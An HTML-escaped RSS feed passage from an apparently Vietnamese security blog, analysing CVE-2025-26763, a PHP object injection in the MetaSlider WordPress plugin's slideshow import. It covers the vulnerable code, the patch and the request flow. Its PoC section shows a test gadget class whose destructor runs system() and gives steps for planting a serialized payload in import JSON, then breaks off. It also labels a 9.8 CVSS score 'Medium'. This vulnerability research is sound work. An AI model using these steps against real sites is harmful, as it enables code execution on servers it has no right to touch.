aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/remote-code-execution/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/code-snippets/vulnerability/wordpress-code-snippets-plugin-3-9-1-authenticated-contributor-php-code-injection-via-extract-and-php-filter-chains-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Code Snippets Plugin &amp;lt;= 3.9.1 is vulnerable to Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-26763 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-26-cve-2025-26763/</link>
      <pubDate>Wed, 26 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-26-cve-2025-26763/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-26-cve-2025-26763/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;Deserialization of Untrusted Data&lt;/strong&gt; trong plugin &lt;strong&gt;MetaSlider Responsive Slider&lt;/strong&gt; của MetaSlider cho phép &lt;strong&gt;Object Injection&lt;/strong&gt;. Vấn đề này ảnh hưởng đến &lt;strong&gt;Responsive Slider by MetaSlider&lt;/strong&gt; từ phiên bản chưa xác định đến &lt;strong&gt;3.94.0&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-26763&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-26763&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: PHP Object Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.94.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.95.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (9.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Editor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/ml-slider/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Responsive Slider by MetaSlider Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Responsive Slider by MetaSlider&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.94.0&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.95.0&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Trong phiên bản lỗi (v3.94.0):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (isset($slideshow[&amp;#39;meta&amp;#39;]) &amp;amp;&amp;amp; is_array($slideshow[&amp;#39;meta&amp;#39;])) {&#xA;    foreach ($slideshow[&amp;#39;meta&amp;#39;] as $key =&amp;gt; $value) {&#xA;        update_post_meta(&#xA;            $new_slideshow_id,&#xA;            $key,&#xA;            maybe_unserialize(str_replace(&amp;#39;{#ID#}&amp;#39;, $new_slideshow_id, $value))&#xA;        );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong đoạn mã này, hàm &lt;strong&gt;&lt;code&gt;maybe_unserialize()&lt;/code&gt;&lt;/strong&gt; được gọi trực tiếp trên dữ liệu người dùng (&lt;code&gt;$value&lt;/code&gt;). Vì các giá trị này không được kiểm tra hay xác thực trước khi unserialize, kẻ tấn công có thể chèn chuỗi serialized độc hại gây PHP Object Injection.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Bản vá (v3.95.0):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-26-cve-2025-26763/diff.png&#34; title=&#34;Sự thay đổi của bản vá&#34; data-thumbnail=&#34;/posts/2025-11-26-cve-2025-26763/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Sự thay đổi của bản vá&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-26-cve-2025-26763/diff.png&#39; alt=&#34;Diff&#34; height=&#34;406&#34; width=&#34;1885&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Sự thay đổi của bản vá&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Bản vá đã bổ sung hai lớp bảo vệ quan trọng để ngăn dữ liệu độc hại bị unserialize:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Chặn ngay mọi giá trị meta có dạng serialized object (O:). Nếu phát hiện, quá trình import dừng lại và slideshow bị xoá.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (isset($slideshow[&amp;#39;meta&amp;#39;]) &amp;amp;&amp;amp; is_array($slideshow[&amp;#39;meta&amp;#39;])) {&#xA;    foreach ($slideshow[&amp;#39;meta&amp;#39;] as $key =&amp;gt; $value) {&#xA;&#xA;        // @since 3.95 - Stop the process and cleanup if we catch non valid data in JSON&#xA;        if ( is_serialized( $value ) &amp;amp;&amp;amp; substr( trim( $value ), 0, 2 ) === &amp;#39;O:&amp;#39; ) {&#xA;            wp_trash_post($new_slideshow_id);&#xA;&#xA;            return new WP_Error(&#xA;                &amp;#39;import_slideshow_error&amp;#39;,&#xA;                esc_html__( &amp;#39;Import file is invalid.&amp;#39;, &amp;#39;ml-slider&amp;#39; )&#xA;            );&#xA;        }&#xA;&#xA;        update_post_meta(&#xA;            $new_slideshow_id,&#xA;            $key,&#xA;            $this-&amp;gt;maybe_unserialize(str_replace(&amp;#39;{#ID#}&amp;#39;, $new_slideshow_id, $value))&#xA;        );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Thay thế &lt;code&gt;maybe_unserialize()&lt;/code&gt; bằng phiên bản an toàn hơn, dùng &lt;code&gt;unserialize(..., [&#39;allowed_classes&#39; =&amp;gt; false])&lt;/code&gt; để &lt;strong&gt;không cho phép tạo object&lt;/strong&gt; khi giải nén dữ liệu.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function maybe_unserialize( $data ) {&#xA;    if ( is_serialized( $data ) ) { // Don&amp;#39;t attempt to unserialize data that wasn&amp;#39;t serialized going in.&#xA;        return @unserialize( trim( $data ), array( &amp;#39;allowed_classes&amp;#39; =&amp;gt; false ) );&#xA;    }&#xA;&#xA;    return $data;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nhờ đó, nguy cơ PHP Object Injection được loại bỏ.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đã đăng ký một POST API:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected $namespace = &amp;#39;metaslider/v1&amp;#39;;&#xA;register_rest_route($this-&amp;gt;namespace, &amp;#39;/slideshow/import&amp;#39;, array(array(&#xA;    &amp;#39;methods&amp;#39; =&amp;gt; &amp;#39;POST&amp;#39;,&#xA;    &amp;#39;callback&amp;#39; =&amp;gt; array($this-&amp;gt;api, &amp;#39;import_slideshows&amp;#39;),&#xA;    &amp;#39;permission_callback&amp;#39; =&amp;gt; array($this-&amp;gt;api, &amp;#39;can_access&amp;#39;)&#xA;)));&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;với callback &lt;code&gt;import_slideshows&lt;/code&gt; và kiểm tra quyền thông qua &lt;code&gt;can_access()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;const DEFAULT_CAPABILITY_EDIT_SLIDES = &amp;#39;edit_others_posts&amp;#39;;&#xA;public function can_access()&#xA;{&#xA;    $capability = apply_filters(&amp;#39;metaslider_capability&amp;#39;, MetaSliderPlugin::DEFAULT_CAPABILITY_EDIT_SLIDES);&#xA;&#xA;    // Check for the nonce on the server (used by WP REST)&#xA;    if (isset($_SERVER[&amp;#39;HTTP_X_WP_NONCE&amp;#39;]) &amp;amp;&amp;amp; wp_verify_nonce(sanitize_key($_SERVER[&amp;#39;HTTP_X_WP_NONCE&amp;#39;]), &amp;#39;wp_rest&amp;#39;)) {&#xA;        return current_user_can($capability);&#xA;    }&#xA;&#xA;    // This is for when not using Axios (example: callout.php)&#xA;    if (isset($_REQUEST[&amp;#39;METASLIDER_NONCE&amp;#39;]) &amp;amp;&amp;amp; wp_verify_nonce(sanitize_key($_REQUEST[&amp;#39;METASLIDER_NONCE&amp;#39;]), &amp;#39;metaslider_request&amp;#39;)) {&#xA;        return current_user_can($capability);&#xA;    }&#xA;&#xA;    return false;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm này chỉ cho phép người dùng có quyền &lt;code&gt;edit_others_posts&lt;/code&gt; tức là &lt;strong&gt;editor&lt;/strong&gt; trở lên, được gọi API.&lt;/p&gt;&#xA;&lt;p&gt;Nó xác thực theo hai cách:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Nếu có header &lt;code&gt;X-WP-Nonce&lt;/code&gt;, plugin kiểm tra nonce &lt;code&gt;&#39;wp_rest&#39;&lt;/code&gt;, rồi xác nhận người dùng có quyền &lt;code&gt;edit_others_posts&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Nếu có tham số &lt;code&gt;METASLIDER_NONCE&lt;/code&gt;, plugin kiểm tra nonce &lt;code&gt;&#39;metaslider_request&#39;&lt;/code&gt;, rồi tiếp tục kiểm tra quyền.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;Nếu không hợp lệ ở cả hai trường hợp, quyền truy cập API bị từ chối.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function import_slideshows($request)&#xA;{&#xA;    if (!$this-&amp;gt;can_access()) {&#xA;        $this-&amp;gt;deny_access();&#xA;    }&#xA;&#xA;    $data = $this-&amp;gt;get_request_data($request, array(&amp;#39;slideshows&amp;#39;));&#xA;&#xA;    if (!$data[&amp;#39;slideshows&amp;#39;]) {&#xA;        wp_send_json_error(array(&#xA;            &amp;#39;message&amp;#39; =&amp;gt; __(&amp;#39;Nothing to import.&amp;#39;, &amp;#39;ml-slider&amp;#39;)&#xA;        ), 400);&#xA;    }&#xA;&#xA;    $status = $this-&amp;gt;slideshows-&amp;gt;import((array) json_decode($data[&amp;#39;slideshows&amp;#39;], true));&#xA;&#xA;    if (is_wp_error($status)) {&#xA;        wp_send_json_error(array(&#xA;            &amp;#39;message&amp;#39; =&amp;gt; $status-&amp;gt;get_error_message()&#xA;        ), 400);&#xA;    }&#xA;&#xA;    wp_send_json_success($status, 200);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;import_slideshows&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Kiểm tra quyền truy cập&lt;/strong&gt;&#xA;Nếu &lt;code&gt;can_access()&lt;/code&gt; trả về false → chặn ngay bằng &lt;code&gt;deny_access()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Lấy dữ liệu đầu vào&lt;/strong&gt;&#xA;Lấy trường &lt;code&gt;slideshows&lt;/code&gt; từ request. Nếu không có dữ liệu → trả lỗi “Nothing to import”.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Giải mã JSON và tiến hành import&lt;/strong&gt;&#xA;Giải mã nội dung &lt;code&gt;slideshows&lt;/code&gt; rồi gọi hàm &lt;code&gt;$this-&amp;gt;slideshows-&amp;gt;import()&lt;/code&gt; để xử lý.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Xử lý lỗi&lt;/strong&gt;&#xA;Nếu import trả về &lt;code&gt;WP_Error&lt;/code&gt; → gửi JSON error với thông báo lỗi.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Thành công&lt;/strong&gt;&#xA;Nếu không có lỗi → trả về JSON success kèm kết quả import.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;Theo mô tả của hàm &lt;code&gt;import()&lt;/code&gt; thì &lt;code&gt;$slideshows&lt;/code&gt; là data được export từ &lt;strong&gt;slideshows đã tạo&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition quote open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Trích dẫn&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;/**&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Will import slideshows&lt;/li&gt;&#xA;&lt;li&gt;&lt;/li&gt;&#xA;&lt;li&gt;@param array $slideshows - The data generated by the export method&lt;/li&gt;&#xA;&lt;li&gt;&lt;/li&gt;&#xA;&lt;li&gt;@throws Exception - handled within method.&lt;/li&gt;&#xA;&lt;li&gt;@return WP_Error|array - True on success, WP_Error on failure&#xA;*/&lt;/li&gt;&#xA;&lt;/ul&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;pre&gt;&lt;code&gt;foreach ($slideshows as $index =&amp;gt; $slideshow) {&#xA;    ...&#xA;    foreach ($slideshow[&amp;#39;slides&amp;#39;] as $slide) {&#xA;        ...&#xA;        foreach ($slide[&amp;#39;meta&amp;#39;] as $key =&amp;gt; $value) {&#xA;            $value = $this-&amp;gt;restore_image_urls_from_string($value);&#xA;            add_post_meta($new_slide_id, $key, maybe_unserialize($value));&#xA;        }&#xA;    }&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;import()&lt;/code&gt; duyệt lần lượt từng slideshow trong &lt;code&gt;$slideshows&lt;/code&gt;, sau đó từng slide trong mỗi slideshow, và từng meta của mỗi slide. Với mỗi meta, nó phục hồi URL hình ảnh qua &lt;code&gt;$this-&amp;gt;restore_image_urls_from_string($value)&lt;/code&gt; rồi thêm meta mới cho slide bằng &lt;code&gt;add_post_meta($new_slide_id, $key, maybe_unserialize($value))&lt;/code&gt;. Nói cách khác, mã thực hiện import toàn bộ slideshow, slide và meta, đồng thời xử lý URL hình ảnh và unserialize dữ liệu trước khi lưu vào cơ sở dữ liệu.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;&#xA;A[&amp;#34;Editor sends POST request → /metaslider/v1/slideshow/import&amp;#34;] --&amp;gt; B[&amp;#34;import_slideshows() invoked&amp;#34;]&#xA;B --&amp;gt; C{&amp;#34;can_access(): verify nonce &amp;#43; &amp;#39;edit_others_posts&amp;#39; capability&amp;#34;}&#xA;C -- Fail --&amp;gt; Z[&amp;#34;deny_access()&amp;#34;]&#xA;C -- Pass --&amp;gt; D[&amp;#34;Extract &amp;#39;slideshows&amp;#39; from request&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;json_decode(slideshows) → array of slideshow data&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;slideshows-&amp;gt;import() begins&amp;#34;]&#xA;&#xA;F --&amp;gt; G[&amp;#34;foreach ($slideshows as $slideshow)&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;foreach ($slideshow[&amp;#39;slides&amp;#39;] as $slide)&amp;#34;]&#xA;H --&amp;gt; I[&amp;#34;foreach ($slide[&amp;#39;meta&amp;#39;] as key =&amp;gt; value)&amp;#34;]&#xA;&#xA;I --&amp;gt; J[&amp;#34;value = restore_image_urls_from_string(value)&amp;#34;]&#xA;J --&amp;gt; K{&amp;#34;Is value serialized?&amp;#34;}&#xA;&#xA;K -- Yes --&amp;gt; L[&amp;#34;maybe_unserialize(value)&amp;#34;]&#xA;K -- No --&amp;gt; M[&amp;#34;Store meta normally&amp;#34;]&#xA;&#xA;L --&amp;gt; N{&amp;#34;Does unserialize create an object?&amp;#34;}&#xA;N -- Yes --&amp;gt; R[&amp;#34;Object Injection → POP chain execution&amp;#34;]&#xA;N -- No --&amp;gt; M&#xA;&#xA;M --&amp;gt; O[&amp;#34;add_post_meta(new_slide_id, key, value)&amp;#34;]&#xA;O --&amp;gt; P[&amp;#34;Import continues for remaining slideshows&amp;#34;]&#xA;&#xA;R --&amp;gt; Q[&amp;#34;Exploit achieved&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Tạo class để test đặt trong &lt;code&gt;wp-config.php&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;class Evil&#xA;{&#xA;    public $command = &amp;#34;ls /&amp;#34;;&#xA;    public function __destruct()&#xA;    {&#xA;        die(system($this-&amp;gt;command));&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Tạo một slideshow bất kỳ, export để lấy JSON file mẫu.&lt;/li&gt;&#xA;&lt;li&gt;Sửa lại JSON file với trường &lt;code&gt;ml-slider_type&lt;/code&gt; (hoặc một trường được duyệt bất kì) chứa chuỗi serialized.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;Example:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;0&amp;#34;: {&#xA;    &amp;#34;title&amp;#34;: &amp;#34;New Slideshow&amp;#34;,&#xA;    &amp;#34;original_id&amp;#34;: 260,&#xA;    &amp;#34;meta&amp;#34;: 